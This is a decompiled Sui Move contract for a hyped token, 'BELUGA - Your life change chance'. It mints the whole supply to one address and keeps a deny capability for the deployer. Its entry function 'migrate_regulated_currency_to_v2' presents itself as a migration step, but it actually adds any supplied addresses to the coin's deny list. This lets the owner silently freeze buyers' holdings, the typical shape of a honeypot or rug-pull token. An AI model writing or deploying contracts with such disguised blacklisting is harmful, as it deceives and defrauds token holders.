module 0xf855cfd858b65b9871508fb20d0c3316ed9a04c95f1e3d216dd9de9c31d32e76::BELUGA {
    struct BELUGA has drop {
        dummy_field: bool,
    }

    fun init(arg0: BELUGA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BELUGA>(arg0, 6, b"BELU", b"BELUGA", b"BELUGA - Your life change chance", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.imgur.com/PPxS0rD.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BELUGA>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BELUGA>>(v1, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::Coin<BELUGA>>(0x2::coin::mint<BELUGA>(&mut v3, 1000000000000000, arg1), @0x7b3c5d549871784c7a9aaf06970698b9c7a7acaf23171d6f1f0de4094176225b);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BELUGA>>(v3);
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BELUGA>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_v2_contains_current_epoch<BELUGA>(arg0, v1, arg3)) {
                0x2::coin::deny_list_v2_add<BELUGA>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

